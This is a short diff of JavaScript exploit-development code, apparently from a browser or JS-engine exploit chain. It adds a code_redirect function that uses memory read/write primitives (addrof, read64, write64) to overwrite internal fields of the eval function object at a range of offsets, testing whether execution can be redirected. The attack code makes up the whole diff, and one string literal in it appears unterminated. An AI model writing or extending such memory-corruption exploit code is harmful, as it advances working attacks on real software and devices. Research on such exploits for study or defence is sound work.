@@ -41,4 +41,17 @@ function dump_eval() {
     }
 }
 
-dump_eval();
+function code_redirect() {
+    const func = mem.addrof(eval).readp(0x18);
+
+    for (let i = 0x28; i < 0x50; i += 8) {
+        alert(`test ${i.toString(16)}`);
+        let old = func.read64(i);
+        func.write64(i, Int.Zero);
+        func("alert('no crash, next...");
+        func.write64(i, old);
+    }
+}
+
+//dump_eval();
+code_redirect();
